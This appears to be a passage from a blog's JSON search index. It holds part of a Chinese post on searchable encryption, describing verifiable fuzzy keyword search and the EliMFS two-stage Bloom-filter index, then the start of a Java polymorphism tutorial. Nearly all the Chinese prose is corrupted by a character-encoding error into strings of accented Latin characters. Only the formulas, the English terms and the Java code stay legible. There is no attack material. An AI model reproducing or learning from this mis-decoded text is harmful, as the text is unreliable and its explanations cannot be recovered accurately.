-0.3]ï¼Œå®ƒè¢«æ‰©å±•ä¸º [0, -0.3, 0, 0, 0, -0.3, 0, -0.3, 0, -0.3, 1, -0.1] ï¼Œä½¿ç”¨å€¼ 1 å’Œ -0.1 \n- Q' = [0.1,-0.3, 0, 0.1, 0, -0.3, 0.1, -0.05, 0, -0.3, 0.6, 0.05] ï¼ŒQ\" = [-0.1, -0.3, 0, -0.1, 0, -0.3, -0.1, -0.25, 0, -0.3, -0.6, -0.15] \n- æœ€åï¼Œ Q' å’Œ Q\"  ç”¨çŸ©é˜µï¼ˆM<sub>1</sub> , M<sub>2</sub>ï¼‰åŠ å¯†ï¼Œæœ€åçš„ç»“æœæ˜¯Enc<sub>sk</sub>(I<sub>i</sub>) = { I'<sub>i</sub> = M<sub>1</sub><sup>-1</sup> â€¢ Q'  , I\"<sub>i</sub> = M<sub>2</sub><sup>-1</sup> â€¢ Q\"  } = [0.1, -0.3, 0, 0.1, 0, -0.3, 0.1, -0.05, 0, -0.3, 0.6, 0.05, -0.1, -0.3, 0, -0.1, 0, -0.3,-0.1, -0.25, 0, -0.3, -0.6, -0.15]\n\n#### è®¤è¯ç®—æ³•\n\nAuth(SK, L, Enc<sub>sk</sub>(I) or Enc<sub>sk</sub>(Q))â†’Ïƒ<sub>I</sub> or Ïƒ<sub>Q</sub>Â èº«ä»½éªŒè¯æ ‡è®°ç”Ÿæˆç®—æ³•ï¼Œè¯¥ç®—æ³•ä¸ºæ¯ä¸ªåŠ å¯†çš„ç´¢å¼•æˆ–åŠ å¯†çš„é™·é—¨ç”Ÿæˆè®¤è¯æ ‡ç­¾ã€‚\n\n- ä»£ç†æœåŠ¡å™¨é¦–å…ˆå¯¹ Enc<sub>sk</sub>(I<sub>i</sub>) æˆ– Enc<sub>sk</sub>(Q) çš„æ¯ä¸€é¡¹è¿›è¡Œæ ‡è®°\n- Enc<sub>sk</sub>(I<sub>i</sub>)[j] è¢«æ ‡è®°ä¸º L<sub>Enc<sub>sk</sub>(I<sub>i</sub>),j</suB> è¡¨ç¤ºåœ¨ i ä½ç½®çš„ ç´¢å¼• I<sub>i</sub> ä¸­çš„ç¬¬ j é¡¹\n- Enc<sub>sk</sub>(Q)[j] è¢«æ ‡è®°ä¸º L<sub>Enc<sub>sk</sub>(Q),j</suB> è¡¨ç¤ºé™·é—¨ Q ä¸­çš„ç¬¬ j é¡¹\n- ç„¶åï¼Œå¯¹äºåŠ å¯†ç´¢å¼• Enc<sub>sk</sub>(I<sub>i</sub>) ä¸­çš„æ¯ä¸€é¡¹ Enc<sub>sk</sub>(I<sub>i</sub>)[j]ï¼Œä»£ç†æœåŠ¡å™¨è°ƒç”¨ Real-HomMAC\n- Auth(SKï¼ŒL<sub>Enc<sub>sk</sub>(I<sub>i</sub>),j</suB>ï¼ŒEnc<sub>sk</sub>(I<sub>i</sub>)[j]) è¾“å‡º (y<sub>0</sub><sup>(j)</sup>, y<sub>1</sub><sup>(j)</sup>) = (Enc<sub>sk</sub>(I<sub>i</sub>)[j],(r<sub>i,j</sub> âˆ’ Enc<sub>sk</sub>(I<sub>i</sub>)[j])/Î±\n- å¼ä¸­ r = F<sub>K</sub>(L<sub>Enc<sub>sk</sub>(I<sub>i</sub>),j</suB>)ã€‚è¿™æ ·ï¼Œä»£ç†ä¸ºåŠ å¯†ç´¢å¼• Enc<sub>sk</sub>(I<sub>i</sub>) ç”Ÿæˆè®¤è¯æ ‡ç­¾ Ïƒ<sub>I<sub>i</sub></sub>\n- ä»£ç†æœåŠ¡å™¨ä¸ºåŠ å¯†çš„é™·é—¨ Enc<sub>sk</sub>(Q) ç”Ÿæˆè®¤è¯æ ‡ç­¾ Ïƒ<sub>Q</sub> ã€‚\n\n#### æœç´¢ç®—æ³•\n\nSearch(f, Ïƒ<sub>I</sub> , Ïƒ<sub>Q</sub>)â†’Ïƒ æ¨¡ç³Šå…³é”®è¯æœç´¢ç®—æ³•ï¼Œæ¨¡ç³Šå…³é”®è¯æœç´¢å‡½æ•°fã€ç´¢å¼•æ ‡è®° Ïƒ<sub>I</sub> å’Œé™·é—¨æ ‡è®° Ïƒ<sub>QÂ </sub>ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¾“å‡ºç»“æœ Ïƒ =ï¼ˆÏƒ<sub>0</sub>ï¼ŒÂ·Â·Â·ï¼ŒÏƒ<sub>k</sub>ï¼‰å…·ä½“æ­¥éª¤å¦‚ä¸‹:\n\n- åŠ å¯†é™·é—¨è·å¾—ç›¸å…³åˆ†æ•° sco<sub>i</sub> = f(Enc<sub>sk</sub>(I) , Enc<sub>sk</sub>(Q))ï¼Œé€‰æ‹©ç›¸å…³åº¦æœ€é«˜çš„ k ä¸ªæœç´¢ç»“æœï¼Œæœ€åï¼Œå¯¹äº k ä¸ªæœç´¢ç»“æœï¼Œæ¯”å¦‚ f<sub>i</sub>ï¼Œè°ƒç”¨ RealHomMacï¼ŒEvalï¼ˆfï¼Œ{Ïƒ<sub>I</sub> , Ïƒ<sub>Q</sub>}ï¼‰ä»¥è¾“å‡ºå…¶è¯æ˜ Ïƒ<sub>i</sub> = (y<sub>0</sub>, y<sub>1</sub>, y<sub>2</sub>)\n\n- ï¼ˆ1ï¼‰å°†ç´¢å¼• I è¡¨ç¤ºä¸º I =  ( I<sub>1</sub> , I<sub>2</sub> ,â€¦, I<sub>n</sub> ) å¯¹äºæ¯ä¸€ä¸ª I<sub>i </sub>\n  - â‘  å°† I<sub>i </sub>è¡¨ç¤ºä¸º I<sub>i Â </sub>= (I'<sub>i</sub> ï¼ŒI\"<sub>i</sub> ) ï¼Œå°† t è¡¨ç¤ºä¸º t = (t'ï¼Œt\") \n  - â‘¡ è®¡ç®—å‘é‡çš„æ•°é‡ç§¯ï¼š R<sub>I</sub> = I'<sub>i</sub> â€¢ t'  + I\"<sub>i</sub>  â€¢ t\"\n  - â‘¢ æŒ‰æ’åºç®—æ³•å°†è®¡ç®—çš„å‘é‡å†…ç§¯(æ•°é‡ç§¯)ä½œæ’åº\n\n#### éªŒè¯ç®—æ³•\n\nVerify(SK, P, sco<sub>i</sub>, Ïƒ<sub>i</sub>)\n\n- è®¾ P= (f, L<sub>Enc<sub>sk</sub>(I<sub>i</sub>)</suB>ï¼ŒL<sub>Enc<sub>sk</sub>(Q)</suB>) ä»£ç†æœåŠ¡å™¨è°ƒç”¨ Real-HomMACã€‚\n- Verify(SK, P, sco<sub>i</sub>, Ïƒ<sub>i</sub>)ï¼Œæ ¹æ®å¦‚ä¸‹å…¬å¼éªŒè¯ sco<sub>i</sub> çš„æ­£ç¡®æ€§ã€‚\n  - å¦‚æœå…¬å¼æˆç«‹ï¼Œä»£ç†æœåŠ¡å™¨æ¥å— f<sub>i</sub> ä½œä¸ºæœç´¢ç»“æœ\n  - å¦åˆ™æ‹’ç» f<sub>i</sub> \n\n![](https://img.jwt1399.top/img/image-20220323001152007.png)\n\n\n\n#### æ›´æ–°ç®—æ³•\n\nUpdate(F<sub>temp</sub>, SK)\n\nè¯¥ç®—æ³•åŒ…æ‹¬æ·»åŠ æ–‡ä»¶ã€åˆ é™¤æ–‡ä»¶å’Œä¿®æ”¹æ–‡ä»¶ä¸‰ä¸ªæ“ä½œã€‚åœ¨æ·»åŠ æ–‡ä»¶æ—¶ï¼Œä»£ç†æœåŠ¡å™¨å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œè°ƒç”¨ Auth ä¸ºå…¶ç”Ÿæˆèº«ä»½éªŒè¯æ ‡è®°ï¼Œæœ€åå°†å…¶å¤–åŒ…ç»™äº‘æœåŠ¡å™¨ã€‚å½“åˆ é™¤æ–‡ä»¶æ—¶ï¼Œä»£ç†æœåŠ¡å™¨éœ€è¦ä¸äº‘æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œåˆ é™¤å¯¹åº”çš„å¯†æ–‡å’Œç´¢å¼•ã€‚å¯¹äºæ–‡ä»¶ä¿®æ”¹ï¼Œç›¸å½“äºåˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ–‡ä»¶\n\n## â‘¥EliMFSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠEliMFS: Achieving Efficient, Leakage-Resilient, and Multi-Keyword Fuzzy Search on Encrypted Cloud Dataã€‹**\n\n- ä½œè€…ï¼šé™ˆé™; ä½•å¤; é‚“å…°; æ³‰æº; æœç‘è‹±; æ¨ç¿”; å´æ°\n- å•ä½ï¼šæ­¦æ±‰å¤§å­¦\n- åˆŠç‰©ï¼š[IEEE Transactions on Services Computing](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/8078212)ã€CCF Bã€‘\n- æ—¶é—´ï¼š2017å¹´10æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\nè¯¥æ–¹æ¡ˆåˆ©ç”¨äº†ä¸€ç§æ–°é¢–çš„**ä¸¤é˜¶æ®µç´¢å¼•ç»“æ„**æ¥ç¡®ä¿æœç´¢æ—¶é—´ä¸æ–‡ä»¶é›†å¤§å°æ— å…³ã€‚å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢é€šè¿‡åŸºäº **bi-gram ** **å¸ƒéš†è¿‡æ»¤å™¨**å’Œ**å±€éƒ¨æ•æ„Ÿæ•£åˆ—**çš„ç²¾ç»†è®¾è®¡å®ç°çš„ã€‚æ­¤å¤–ï¼Œè€ƒè™‘åˆ°ç”±ä¸¤é˜¶æ®µç´¢å¼•ç»“æ„å¼•èµ·çš„æ³„æ¼ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸¤ç§å…·ä½“çš„æ–¹æ¡ˆæ¥æŠµæŠ—ä¸åŒå¨èƒæ¨¡å‹ä¸­çš„è¿™äº›æ½œåœ¨æ”»å‡»ã€‚\n\næœ¬æ–‡çš„ä¸»è¦è´¡çŒ®å½’çº³å¦‚ä¸‹:\n\n- ï¼ˆ1ï¼‰è¿™æ˜¯ç¬¬ä¸€ä¸ªé’ˆå¯¹åŠ å¯†äº‘æ•°æ®çš„**å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢æ–¹æ¡ˆ**ï¼Œå…¶æœç´¢å¤æ‚æ€§ä¸æ–‡ä»¶å¤§å°æ— å…³;\n- ï¼ˆ2ï¼‰ä¸ç°æœ‰çš„å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢è§£å†³æ–¹æ¡ˆç›¸æ¯”ï¼Œæˆ‘ä»¬è®¾è®¡äº†ä¸€ç§æ–°é¢–çš„**ä¸¤é˜¶æ®µç´¢å¼•ç»“æ„**å’Œç›¸åº”çš„æœç´¢ç®—æ³•ï¼Œä»¥æé«˜å¯¹åŠ å¯†äº‘æ•°æ®çš„æœç´¢æ•ˆç‡;\n- ï¼ˆ3ï¼‰ä¸ºäº†ä¿æŠ¤æ•°æ®éšç§ï¼Œæˆ‘ä»¬åˆ†æäº†ä¸åŒå¨èƒæ¨¡å‹ä¸­æ¡†æ¶å¯èƒ½å­˜åœ¨çš„æ³„æ¼ï¼Œå¹¶æå‡ºäº†ä¸¤ç§å®ç°**æ³„æ¼å¼¹æ€§**çš„å…·ä½“æ–¹æ¡ˆ;\n- ï¼ˆ4ï¼‰å¯¹éšç§å’Œæ•ˆç‡è¿›è¡Œäº†å…¨é¢åˆ†æï¼Œå¯¹çœŸå®ä¸–ç•Œæ•°æ®é›†çš„å®éªŒè¿›ä¸€æ­¥è¡¨æ˜ï¼Œæˆ‘ä»¬çš„è®¾è®¡åœ¨æœç´¢è¿‡ç¨‹ä¸­å…·æœ‰è¾ƒä½çš„å¼€é”€ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°\n- å¸ƒéš†è¿‡æ»¤å™¨\n- å®‰å…¨è¿‘é‚»ç®—æ³•\n- bi-gram å…³é”®å­—å˜æ¢\n- å€’æ’ç´¢å¼•\n\n###  3ã€æ–¹æ¡ˆå®ç°\n\n![](https://img.jwt1399.top/img/he2-2765323-small.gif)\n\n- é¦–å…ˆæ„å»ºäº†ä¸€ä¸ªåŒ…å«å„ç§æ–‡ä»¶æ ‡è¯†ç¬¦å’Œå…³é”®å­—çš„ä¸¤é˜¶æ®µå®‰å…¨ç´¢å¼•ã€‚\n- æœç´¢å¤æ‚æ€§ä»…ç”±æŸ¥è¯¢ä¸­ä¸ä¸€ä¸ªå…³é”®å­—å…³è”çš„æ–‡ä»¶æ•°å†³å®šï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–‡ä»¶é›†å¤§å°\n- åœ¨ç¬¬ä¸€é˜¶æ®µç´¢å¼•ä¸­ï¼Œæ¯ä¸ªå…³é”®å­—éƒ½è½¬æ¢ä¸ºä¸€ä¸ªæ ‡è®°ï¼Œè¯¥æ ‡è®°æŒ‡å‘åŒ…å«æ­¤å…³é”®å­—çš„æ‰€æœ‰æ–‡ä»¶æ ‡è¯†ç¬¦ã€‚\n- ç¬¬äºŒä¸ªç´¢å¼•æ°æ°ç›¸åï¼Œå®ƒç”±æ‰€æœ‰æ–‡ä»¶æ ‡è¯†ç¬¦åŠå…¶åŒ¹é…çš„å…³é”®å­—ç”Ÿæˆã€‚\n\n- è€ƒè™‘åˆ°éšç§ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªæ¡†æ¶æ—¶ï¼Œæ¯ä¸ªæ–‡ä»¶æ ‡è¯†ç¬¦éƒ½ä¼šè¢«ç®—æ³• Enc åŠ å¯†ã€‚\n- å¯¹äºæ¨¡ç³Šæœç´¢å‡½æ•°ï¼Œå°†å…³é”®å­— w<sub>iÂ </sub>è½¬æ¢ä¸ºä¸­é—´å€¼ Viï¼Œ\n- V<sub>i</sub> é€šè¿‡é¡ºåºè®¡ç®— 2-gram åºåˆ—çš„ 26 x 26 ä½æ•°ç»„å’Œ LSH å€¼ã€‚\n- åœ¨ç¬¬ä¸€çº§ç´¢å¼•ä¸­ï¼Œç”± tagi è¢« vi å’Œ ä¼ªéšæœºå‡½æ•° F(x) åˆ›å»ºã€‚\n- åœ¨ç¬¬äºŒé˜¶æ®µç´¢å¼•ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶æ ‡è¯†ç¬¦éƒ½æ˜ å°„åˆ°ä¸€ä¸ª Bloom Filterï¼Œè¯¥è¿‡æ»¤å™¨ç”±å¤šå…³é”®å­—çš„æ‰€æœ‰ä¸­é—´å€¼æ¨å¯¼è€Œæˆã€‚\n- åœ¨è¿™ç§ä¸¤é˜¶æ®µç´¢å¼•ç»“æ„ä¸­ï¼Œç¬¬ä¸€é˜¶æ®µèƒ½å¤Ÿé«˜æ•ˆåœ°æ‰§è¡Œå•å…³é”®å­—æœç´¢ï¼Œå¹¶åœ¨å¤šå…³é”®å­—æœç´¢ä¸­ç¼©å°æœç´¢èŒƒå›´ã€‚\n- ç¬¬äºŒé˜¶æ®µç”¨äºä¼°è®¡ç¬¬ä¸€é˜¶æ®µçš„ç»“æœæ˜¯å¦ç¡®å®åŒ…å«æ‰€æœ‰ç›®æ ‡å…³é”®å­—\n\n#### EliMFS-B\n\n##### å¯†é’¥å’Œå®‰å…¨ç´¢å¼•ç”Ÿæˆ\n\n![](https://img.jwt1399.top/img/he.t2-2765323-large.gif)\n\næ­¥éª¤ä¸€ï¼šç”Ÿæˆå¯†é’¥\n\n- ä¸¤ä¸ªéšæœºåºåˆ—ï¼ˆK<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼‰\n- ä¸¤ä¸ªå¯é€†çŸ©é˜µï¼ˆM<sub>1</sub>ï¼ŒM<sub>2</sub>ï¼‰\n- ä¸€ä¸ªå‘é‡ S\n\næ­¥éª¤äºŒï¼šå»ºç«‹æ–‡ä»¶ç´¢å¼•\n\n- é€šè¿‡ l hash å‡½æ•°è®¡ç®—ä¸­é—´å€¼ V<sub>w</sub> ã€é€šè¿‡ä¼ªéšæœºå‡½æ•° F åŠ å¯† V<sub>wÂ </sub>è®¡ç®—æ ‡è®° tagã€\n- é€šè¿‡ K<sub>2 </sub>  å’Œ V<sub>w</sub> ç”ŸæˆåŠ å¯†æ–‡ä»¶æ ‡è¯†ç¬¦çš„å¯†é’¥ K<sub>e</sub>\n- ç”¨ K<sub>eÂ </sub> åŠ å¯†æ–‡ä»¶æ ‡è¯†ç¬¦ id å¾—åˆ° e ï¼Œå¹¶é™„åŠ åˆ° I<sub>1</sub>[tag]ï¼Œå¾—åˆ° I<sub>1</sub>\n- è®¾ç½®å¸ƒéš†è¿‡æ»¤å™¨ h<sub>1</sub>(V<sub>w</sub>),h<sub>2</sub>(V<sub>w</sub>),...,h<sub>k</sub>(V<sub>w</sub>) ä½ç½®çš„ I<sub>2</sub>\\[id][i] = 1\n\næ­¥éª¤ä¸‰ï¼šä½¿ç”¨[KNNç®—æ³•](https://www.eecis.udel.edu/~ruizhang/CISC859/S17/Paper/p1.pdf)åŠ å¯†ç´¢å¼• I<sub>2</sub> \n\n- å°† å¸ƒéš†è¿‡æ»¤å™¨ I åˆ†è£‚æˆä¸¤ä¸ªå‘é‡ {I' ï¼ŒI\"}\n- æ ¹æ® S è®¡ç®—  I<sub>2</sub>[id] = {M<sub>1</sub><sup>T</sup> â€¢ I' ï¼ŒM<sub>2</sub><sup>T</sup> â€¢ I\"}\n- å¾—åˆ° Index = {I<sub>1</sub>ï¼Œ I<sub>2</sub>}\n\n##### é™·é—¨ç”Ÿæˆ\n\n![](https://img.jwt1399.top/img/he.t3-2765323-large.gif)\n\næ­¥éª¤ä¸€ï¼š\n\n- å‡è®¾åœ¨ç¬¬ä¸€é˜¶æ®µæœç´¢ä¸­é€‰æ‹©çš„å…³é”®å­—æ˜¯ w<sub>1</sub>\n- é‚£ä¹ˆæ•°æ®æ‰€æœ‰è€…é¦–å…ˆè®¡ç®—ä¸­é—´å€¼ V<sub>w1</sub>ã€æ ‡è®° tagã€åŠ å¯†æ–‡ä»¶æ ‡è¯†ç¬¦çš„å¯†é’¥ K<sub>e</sub>\n- å¦‚æœ n(å…³é”®å­—ä¸ªæ•°) = 1ï¼Œåˆ™ä¸æ‰§è¡Œä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼Œç›´æ¥å°†æ ‡è®°tagå‘é€åˆ°äº‘æœåŠ¡å™¨ã€‚\n\næ­¥éª¤äºŒï¼š\n\n- æ„å»º m-bits å¸ƒéš†è¿‡æ»¤å™¨ Bf<sub>q</sub>\n- æ¯ä¸ªå…³é”®å­—éƒ½ç”¨ l LSH å¤„ç†ï¼Œå¹¶ç”¨ k hash å‡½æ•° æ’å…¥åˆ° Bf<sub>q</sub> ä¸­\n\næ­¥éª¤ä¸‰ï¼š\n\n- Bf<sub>qÂ </sub>ä½¿ç”¨ M<sub>1</sub>ï¼ŒM<sub>2</sub>ï¼ŒS åŠ å¯†ï¼Œæ–¹æ³•ä¸ç´¢å¼•åŠ å¯†ç±»ä¼¼\n\n- æ•°æ®æ‰€æœ‰è€…é€‰æ‹©ä¸€ä¸ªé˜ˆå€¼ thr â‰¤ k|w|ï¼Œthr è¢«ç”¨æ¥æ¯”è¾ƒå†…ç§¯ï¼Œåœ¨ç¬¬äºŒä¸ªæœç´¢é˜¶æ®µæ¥åˆ¤æ–­æ˜¯å¦åº”è¯¥è¿”å›æ–‡ä»¶ ID\n- å‘é€ Token = {tagï¼ŒM<sub>1</sub><sup>-1</sup> â€¢ Bf<sub>q</sub>' ï¼ŒM<sub>2</sub><sup>-1</sup> â€¢ Bf<sub>q</sub>\"ï¼ŒK<sub>e</sub>ï¼Œthr} åˆ°äº‘æœåŠ¡å™¨\n\n##### æœç´¢ç®—æ³•\n\n![](https://img.jwt1399.top/img/image-20220209214026209.png)\n\næ­¥éª¤ä¸€ï¼š\n\n- æ”¶åˆ°é™·é—¨åï¼Œè¯»å–æ‰€æœ‰ I<sub>1</sub>[tag]\n- å¦‚æœ Token = {tag}ï¼Œäº‘æœåŠ¡å™¨è¿”å›è¿™äº›æ ‡è¯†ç¬¦å¹¶å®Œæˆç®—æ³•\n- å¦‚æœ Token = {tagï¼ŒM<sub>1</sub><sup>-1</sup> â€¢ Bf<sub>q</sub>' ï¼ŒM<sub>2</sub><sup>-1</sup> â€¢ Bf<sub>q</sub>\"ï¼Œthr}ï¼Œäº‘æœåŠ¡å™¨é€ä¸ªæ£€æŸ¥ I<sub>1</sub>[tag] çš„å¸ƒéš†è¿‡æ»¤å™¨\n\næ­¥éª¤äºŒï¼š\n\n- ç”¨ K<sub>eÂ </sub>è§£å¯†æ–‡ä»¶æ ‡è¯†ç¬¦ e å¾—åˆ° idï¼Œä»è€Œå¾—åˆ° I<sub>2</sub>[id] = {M<sub>1</sub><sup>T</sup> â€¢ I' ï¼ŒM<sub>2</sub><sup>T</sup> â€¢ I\"}\n- {M<sub>1</sub><sup>-1</sup> â€¢ Bf<sub>q</sub>' ï¼ŒM<sub>2</sub><sup>-1</sup> â€¢ Bf<sub>q</sub>\"} å’Œ {M<sub>1</sub><sup>T</sup> â€¢ I' ï¼ŒM<sub>2</sub><sup>T</sup> â€¢ I\"} è¿›è¡Œå†…ç§¯å¾—åˆ° I<sup>T</sup> â€¢ Bf<sub>q</sub>\n- å¦‚æœ  I<sup>T</sup> â€¢ Bf<sub>q</sub> â‰¥ thr å°†æ–‡ä»¶æ ‡è¯†ç¬¦ id æ·»åŠ åˆ°ç»“æœé›†ä¸­\n\n#### EliMFS-E\n\n##### å¯†é’¥å’Œå®‰å…¨ç´¢å¼•ç”Ÿæˆ\n\n![](https://img.jwt1399.top/img/image-20220209214256137.png)\n\n##### é™·é—¨ç”Ÿæˆ\n\n![](https://img.jwt1399.top/img/image-20220209214546891.png)\n\n##### æœç´¢ç®—æ³•\n\n![](https://img.jwt1399.top/img/image-20220209214731732.png)\n\n## â‘¡ï½â‘¥æ–¹æ¡ˆæ€»ç»“\n\n### å¯¹æ¯”\n\n| ç¼–å· | æ–¹æ¡ˆ/æŠ€æœ¯ | LSH  |  BF  | KNN  |   Gram   | ç´¢å¼•å»ºç«‹                      |\n| ---- | :-------- | :--: | :--: | :--: | :------: | ----------------------------- |\n| 2    | MKFS      |  âœ…   |  âœ…   |  âœ…   |    â€”â€”    | å¯¹å¶ç¼–ç å‡½æ•°                  |\n| 3    | TEMKS     |  âœ…   |  âœ…   |  âœ…   | uni-gram | Porter Stemmingã€TF-IDF       |\n| 4    | EDMKFS    |  âœ…   |  âœ…   |  âœ…   | uni-gram | KBBã€ Top-kã€TF-IDF           |\n| 5    | VRFMS     |  âœ…   |  âœ…   |  âœ…   | bi-gram  | Porter Stemmingã€TF-IDF       |\n| 6    | EliMFS    |  âœ…   |  âœ…   |  âœ…   | bi-gram  | inverted indexã€forward index |\n\n### é—ç•™é—®é¢˜\n\n1. ä¸ºä»€ä¹ˆæ¨¡ç³ŠæŸ¥è¯¢çš„ Inner Product å’Œ Socre æ¯”è¾ƒæ¥ç¡®å®šæ–‡æœ¬ç›¸å…³æ€§ï¼Ÿ\n\nå¦‚æœä¸€ä¸ªæ–‡æ¡£åœ¨æŸ¥è¯¢ä¸­åŒ…å«å…³é”®å­—ï¼Œé‚£ä¹ˆä¸¤ä¸ªå‘é‡å¯¹åº”çš„ä½å°†ä¸º 1 ï¼Œå› æ­¤å†…ç§¯å°†è¿”å›ä¸€ä¸ªé«˜å€¼ã€‚å› æ­¤ï¼Œè¿™ä¸ªç®€å•çš„å†…ç§¯ç»“æœæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è¡¡é‡åŒ¹é…å…³é”®å­—çš„æ•°é‡ã€‚\n\né€šå¸¸ï¼ŒScore > 0 è¡¨ç¤ºæ–‡ä»¶åŒ…å«æŸ¥è¯¢å…³é”®å­—ã€‚ä½†ç”±äºå¸ƒéš†è¿‡æ»¤å™¨çš„å‡é˜³æ€§ï¼Œä¸Šè¿°æƒ…å†µå¹¶éå¦‚æ­¤ã€‚åœ¨æ‰€æå‡ºçš„æ–¹æ¡ˆä¸­ï¼Œè¯¥é˜ˆå€¼è¢«è®¾ç½®ä¸ºTH = lï¼Œè¿™æ„å‘³ç€æ ¹æ®æŸ¥è¯¢åªä¼šé€‰æ‹© Score â‰¥ l çš„æ–‡ä»¶\n\n2. å¸ƒéš†è¿‡æ»¤å™¨ä¸­ å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°ä¸ªæ•°å¦‚ä½•ç¡®å®šï¼Ÿ\n\nè¯·å‚è€ƒå°ç®€å†™çš„å¦å¤–ä¸€ç¯‡æ–‡ç« ï¼š[å¸ƒéš†è¿‡æ»¤å™¨VSå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ | ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/35196.html)\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"Java-é¢å‘å¯¹è±¡","url":"/posts/64598.html","content":"\n### å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-é¢å‘å¯¹è±¡ã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n## é¢å‘å¯¹è±¡-åŸºç¡€\n\nç±»ä¸å¯¹è±¡\n\næˆå‘˜æ–¹æ³•\n\næ–¹æ³•é€’å½’\n\næ–¹æ³•é‡è½½\n\nå¯å˜å‚æ•°\n\nä½œç”¨åŸŸ\n\næ„é€ æ–¹æ³•\n\nå¯¹è±¡åˆ›å»º\n\nthiså…³é”®å­—\n\n## é¢å‘å¯¹è±¡-ä¸­çº§\n\n åŒ…\n\nè®¿é—®ä¿®é¥°ç¬¦\n\nå°è£…\n\nç»§æ‰¿\n\nsuperå…³é”®å­—\n\né‡å†™&é‡è½½\n\n### å¤šæ€\n\n#### å¤šæ€å¼•å‡º\n\nè¯·ç¼–å†™ä¸€ä¸ªç¨‹åºï¼ŒMaster ç±»ä¸­æœ‰ä¸€ä¸ª feed æ–¹æ³•ï¼Œ å¯ä»¥å®Œæˆä¸»äººç»™åŠ¨ç‰©å–‚é£Ÿç‰©çš„ä¿¡æ¯ã€‚\n\nä½¿ç”¨ä¼ ç»Ÿçš„æ–¹æ³•æ¥è§£å†³å¸¦æ¥çš„é—®é¢˜æ˜¯ä»€ä¹ˆ? å¦‚ä½•è§£å†³?\n\n```java\npublic class Poly_ {\n    public static void main(String[] args) {\n        Master tom = new Master(\"Tom\");\n        Dog jack = new Dog(\"jack\");\n        Cat jerry = new Cat(\"jerry\");\n        Bone bone = new Bone(\"å¤§éª¨å¤´\");\n        Fish fish = new Fish(\"å°é±¼\");\n\n        tom.feed(jack,bone);\n        tom.feed(jerry,fish);\n    }\n}\n\nclass Master {\n    private String name;\n    public Master(String name) {\n        this.name = name;\n    }\n\t\t//ä¸»äººç»™å°ç‹—å–‚é£Ÿéª¨å¤´\n     public void feed(Dog dog, Bone bone) {\n        System.out.println(\"ä¸»äºº\" + name + \" ç»™\" + dog.getName() + \" åƒ\" + bone.getName());\n     }\n     //ä¸»äººç»™å°çŒ«å–‚é»„èŠ±é±¼\n     public void feed(Cat cat, Fish fish) {\n        System.out.println(\"ä¸»äºº\" + name + \" ç»™\" + cat.getName() + \" åƒ\" + fish.getName());\n     }\n}\n\nclass Animal {\n    private String name;\n    public Animal(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Dog extends Animal {\n    public Dog(String name) {\n        super(name);\n    }\n}\n\nclass Cat extends Animal {\n    public Cat(String name) {\n        super(name);\n    }\n}\n\nclass Food {\n    private String name;\n    public Food(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Bone extends Food {\n    public Bone(String name) {\n        super(name);\n    